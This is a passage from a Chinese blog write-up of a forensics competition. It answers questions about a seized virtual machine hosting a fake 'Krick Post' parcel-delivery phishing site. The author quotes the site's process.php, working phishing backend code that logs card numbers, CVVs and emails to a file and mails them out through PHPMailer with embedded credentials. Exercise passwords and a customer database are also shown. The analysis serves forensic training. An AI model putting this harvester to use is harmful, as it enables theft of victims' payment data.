+</span></span></code></pre></div><p>我们保存为test.sh，给他添加执行权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>chmod +x test.sh
+</span></span></code></pre></div><p>运行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./test.sh
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250815201713295.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815201713295"
+	
+	
+></p>
+<p>一共两个，其中只有ftpuser符合题目选项</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="57虚拟机设置了什么网页服务器web-server">57.虚拟机设置了什么网页服务器(Web Server)?
+</h2><p><strong>A. NGINX</strong></p>
+<p><strong>B. LIGHTTPD</strong></p>
+<p><strong>C. WORDPRESS</strong></p>
+<p><strong>D. APACHE</strong></p>
+<p><strong>E. IIS</strong></p>
+<p>直接在火眼里就能分析，明面上的有apache和nginx，docker容器里面还有一个nginx，再没别的了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815202026740.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815202026740"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>AD
+</span></span></code></pre></div><p>*做到后面回来看，会发现其实真正只有一个 ——  docker的nginx是可以使用的，本机无法检测到nginx和apache，所以这一题真正应该是只nginx：</p>
+<pre tabindex="0"><code>A
+</code></pre><p>*再次更正，其实是有apache的，只不过服务名称是apache2，所以答案还是：</p>
+<pre tabindex="0"><code>AD
+</code></pre><h2 id="58网页服务器目录内有图片档案而此档案的储存位置是">58.网页服务器目录内有图片档案，而此档案的储存位置是?
+</h2><p><strong>A. /var/www/html/post/src</strong></p>
+<p><strong>B. /var/www/html/post/css</strong></p>
+<p><strong>C. /var/www/html/post/vendor</strong></p>
+<p><strong>D. /var/www/post</strong></p>
+<p>没有tree命令，我们使用ls查看一下/var/www：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -R -1 /var/www
+</span></span></code></pre></div><p>在/var/www/html/post/css下发现.png文件：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815202445751.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815202445751"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h2 id="59分析网页服务器的网站数据假网站的公司名称是什么">59.分析网页服务器的网站数据，假网站的公司名称是什么?
+</h2><p><strong>A. Krick Global Logistics</strong></p>
+<p><strong>B. Global Logistics</strong></p>
+<p><strong>C. Krick Post Global Logistics</strong></p>
+<p><strong>D. Krick Post</strong></p>
+<p>一开始我以为火眼分析的apache是错的，因为除了一条空的站点信息啥也没有，但点进去才发现原来这是apache的配置文件，这台服务器上搭载了的是apache2</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815204505809.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815204505809"
+	
+	
+></p>
+<p>其实在上一题就应该意识到了，因为本机没有nginx，却有/var/www目录</p>
+<p>在配置文件里面也能够找到网站页面存放的位置：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815204556092.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815204556092"
+	
+	
+></p>
+<p>那么同上题图，就可以知道一共有html和post两个页面</p>
+<p>服务器的apache2已经打开了，直接访问一下，发现html访问不了，只有post有用：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815205105858.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815205105858"
+	
+	
+></p>
+<pre tabindex="0"><code>C
+</code></pre><p>不要忽略了Krick Post下还有一行小字Global Logistics</p>
+<h2 id="60检视假网站首页的显示ay806369745hk-代表什么">60.检视假网站首页的显示，AY806369745HK 代表什么?
+</h2><p><strong>A. 邮件号码</strong></p>
+<p><strong>B. 邮件收费号码</strong></p>
+<p><strong>C. 邮件序号</strong></p>
+<p><strong>D. 邮件参考号码</strong></p>
+<p>同上题图：</p>
+<pre tabindex="0"><code>A
+</code></pre><h2 id="61分析假网站的资料当受害人经假网站输入数据后网站会产生一个档案它的档案名是什么不要输入以大写英文及阿拉数字回答如-cat10jpg需回答cat10jpg">61.分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么?(不要输入“，以大写英文及阿拉数字回答。如 Cat10.jpg，需回答CAT10JPG)
+</h2><p>查看网站介绍界面/var/www/html/post/index.php，发现这个表单提交数据的方式是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">form</span> <span style="color:#e06c75">align</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;center&#34;</span> <span style="color:#e06c75">action</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;process.php&#34;</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;post&#34;</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;Customerinfo&#34;</span><span style="color:#56b6c2">&gt;</span>
+</span></span></code></pre></div><p>表单会提交到process.php进行文件处理，也就是说档案名取决于process.php内部的实现</p>
+<p>这个文件也在index.php同级，查看可以看到提交的数据会被写入一个固定的文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$resultFile</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;vu.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$fOpen</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fopen</span>(<span style="color:#e06c75">$resultFile</span>, <span style="color:#98c379">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Date &amp; Time: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$dateTime</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Card Holder: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$holdername</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Card no.: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$cardno</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;cvv: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$cvv</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;expire date: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$exp_mth</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;/&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$exp_yr</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Email: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$email</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;@&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$email_domn</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Browser Info: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$browser</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>); <span style="color:#7f848e">//End of Entry
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">fclose</span>(<span style="color:#e06c75">$fOpen</span>);
+</span></span></code></pre></div><p>也就是说档案名是固定的<code>vu.txt</code>，我们也见过，这个文件也在index.php同级</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>VUTXT
+</span></span></code></pre></div><h2 id="62分析假网站档案processphp-源码source-code推测此档案的用途可能是">62.分析假网站档案，process.php&rsquo; 源码(Source Code),推测此档案的用途可能是?
+</h2><p><strong>A. 改变函数</strong></p>
+<p><strong>B. 产生档案</strong></p>
+<p><strong>C. 发出邮件</strong></p>
+<p><strong>D. 更新数据库</strong></p>
+<p>依旧process.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#7f848e">// 从 POST 获取受害人提交的数据
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$holdername</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;holdername&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$cardno</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;cardno&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$cvv</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;cvv&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$exp_mth</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;exp_mth&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$exp_yr</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;exp_yr&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$email</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;email&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$email_domn</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#34;email_domn&#34;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">// 设置档案名称
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$resultFile</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;vu.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">// 打开档案并写入数据
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$fOpen</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fopen</span>(<span style="color:#e06c75">$resultFile</span>, <span style="color:#98c379">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Date &amp; Time: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$dateTime</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Card Holder: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$holdername</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Card no.: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$cardno</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;cvv: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$cvv</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;expire date: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$exp_mth</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;/&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$exp_yr</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Email: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$email</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;@&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$email_domn</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;Browser Info: &#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">$browser</span><span style="color:#56b6c2">.</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fwrite</span>(<span style="color:#e06c75">$fOpen</span>, <span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>); <span style="color:#7f848e">//End of Entry
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">fclose</span>(<span style="color:#e06c75">$fOpen</span>);
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">use</span> <span style="color:#e06c75">PHPMailer\PHPMailer\SMTP</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">require_once</span> <span style="color:#e06c75">__DIR__</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#39;/vendor/phpmailer/src/Exception.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">PHPMailer</span>(<span style="color:#c678dd">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">isSMTP</span>();
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Host</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;smtp.gmai1.com&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">SMTPAuth</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">SMTPSecure</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">PHPMailer</span><span style="color:#56b6c2">::</span><span style="color:#e06c75">ENCRYPTION_STARTTLS</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Port</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">587</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Username</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;chunhe11amm@gmail.com&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;rtatsceucpacocbdacs&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">setFrom</span>(<span style="color:#98c379">&#39;chunhe11amm@gmail.com&#39;</span>, <span style="color:#98c379">&#39;Smith&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">addAddress</span>(<span style="color:#98c379">&#39;chunhe11amm@gmail.com&#39;</span>, <span style="color:#98c379">&#39;Tyler&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">IsHTML</span>(<span style="color:#c678dd">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Subject</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;vu&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Body</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$message</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">AltBody</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39; &#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">send</span>();
+</span></span></code></pre></div><p>它做了两件事：</p>
+<p><strong>产生档案</strong>：把受害人提交的数据写入<code>vu.txt</code></p>
+<p><strong>发出邮件</strong>：将提交的数据通过PHPMailer发送到指定邮箱</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>BC
+</span></span></code></pre></div><h2 id="63检视档案processphp-源码-林浚照的电邮密码是以大写英文回答">63.检视档案process.php&rsquo; 源码, 林浚照的电邮密码是?(以大写英文回答)
+</h2><p>上一题的代码就能看出来，有这样一行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$mail</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">Password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;rtatsceucpacocbdacs&#39;</span>;
+</span></span></code></pre></div><p>也就是说电邮密码是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>RTATSCEUCPACOCBDACS
+</span></span></code></pre></div><h2 id="64分析档案processphp-源码-它不会收集哪些资料">64.分析档案process.php&rsquo; 源码, 它不会收集哪些资料?
+</h2><p><strong>A. GPS位置</strong></p>
+<p><strong>B. 信用卡号码</strong></p>
+<p><strong>C. 短讯验证码</strong></p>
+<p><strong>D. 电话号码</strong></p>
+<p><strong>E. 电邮地址</strong></p>
+<p>还是看源码，不多赘述了</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ACD
+</span></span></code></pre></div><h2 id="65虚拟机-vm-安装了-docker-程序列出一个以5作为开端的-docker-镜像-image-id-以阿拉伯数字及大写英文回答">65.虚拟机 (VM) 安装了 Docker 程序，列出一个以'5&rsquo;作为开端的 &lsquo;Docker&rsquo; 镜像 (Image) ID (以阿拉伯数字及大写英文回答)
+</h2><p>这也能作为题目吗&hellip;</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815210651299.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815210651299"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>5d58c024174d
+</span></span></code></pre></div><h2 id="66docker-容器-container-mysql-对外开放的通讯端口-port-是">66.Docker 容器 (Container) &lsquo;mysql&rsquo; 对外开放的通讯端口 (Port) 是?
+</h2><p>启动看一眼：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815210829763.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815210829763"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>43306
+</span></span></code></pre></div><h2 id="67docker容器mysql用户root-的密码是以大写英文及阿拉伯数字回答">67.Docker容器mysql，用户&rsquo;root&rsquo; 的密码是?(以大写英文及阿拉伯数字回答)
+</h2><p>查看命令历史记录：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815211019920.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815211019920"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>2wsx3edc
+</span></span></code></pre></div><h2 id="68docker容器mysql-里哪一个数据库储存了大量个人资料以大写英文回答">68.Docker容器，mysql 里哪一个数据库储存了大量个人资料?(以大写英文回答)
+</h2><p>在本机链接数据库，账号密码root/2wsx3edc，一找就找到了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815211402518.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815211402518"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CUSTOMER
+</span></span></code></pre></div><h2 id="69检视-docker-容器mysql-内数据库里的资料李大辉的出生日期是如答案为-2022-12-29需答-20221229">69.检视 Docker 容器&rsquo;mysql&rsquo; 内数据库里的资料，李大辉的出生日期是?(如答案为 2022-12-29，需答 20221229)
+</h2><p>sql查询（不知道为什么搜名字搜不出来，可能是过滤条件没写好，电话在李大辉手机可以得到）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">DOB</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">customer</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">Tel</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;852-56412770&#39;</span>
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250815211941873.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815211941873"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>19850214
+</span></span></code></pre></div><h2 id="70通过取证调查结果进行分析包括但不限于以上问题及情节林浚熙的行为涉及哪一种罪案">70.通过取证调查结果进行分析(包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案?
+</h2><p><strong>A.传送儿童色情物品</strong></p>
+<p><strong>B.抢劫</strong></p>
+<p><strong>C.诈骗</strong></p>
+<p><strong>D.勒索金钱</strong></p>
+<p><strong>E.购买毒品</strong></p>
+<p>最好玩的一题</p>
+<p>C是对李大辉</p>
+<p>D是对王晓琳</p>
+<p>E是在林俊熙电脑里面的signal可以看见溜冰的记录：
+<img src="http://picture.928330.xyz/typora/image-20250815212505751.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815212505751"
+	
+	
+></p>
+<p>死罪！！！！</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CDE
+</span></span></code></pre></div><hr>
+<p>总算做完了，这套题是处处透露着诡异，个别题目意义不明，难度两极分化，选择题太多，根据选项才能得到结果，不根据选项又白白浪费提示，要绕很大一圈</p>
+<p>不过整体来说过程还是很清楚的，好玩还是挺好玩</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/forensics/">Forensics</a>
+        
+            <a href="/tags/misc/">Misc</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 2025-08-15
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">长安杯2020取证总结</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">中科实数杯2023取证总结</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
